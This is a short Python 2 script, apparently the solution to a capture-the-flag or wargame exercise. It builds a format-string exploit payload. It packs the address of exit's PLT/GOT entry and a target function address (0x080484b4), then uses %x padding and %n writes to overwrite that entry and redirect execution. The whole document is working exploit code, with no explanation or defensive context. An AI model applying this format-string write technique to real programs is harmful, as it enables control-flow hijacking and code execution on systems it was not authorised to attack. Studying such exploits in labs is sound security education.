import struct
hello = struct.pack("I",0x080484b4)
exitPlt = struct.pack("I",0x8049724)

def pad(s):
        return s + "X" * (512 - len(s))

exploit = ""
exploit += exitPlt
exploit += struct.pack("I",0x8049724 + 2)
exploit += "BBBBCCCC"
exploit += "%4$33956x" 
exploit += "%4$n"
exploit += "%5$33616x"
exploit += "%5$n"

print pad(exploit)
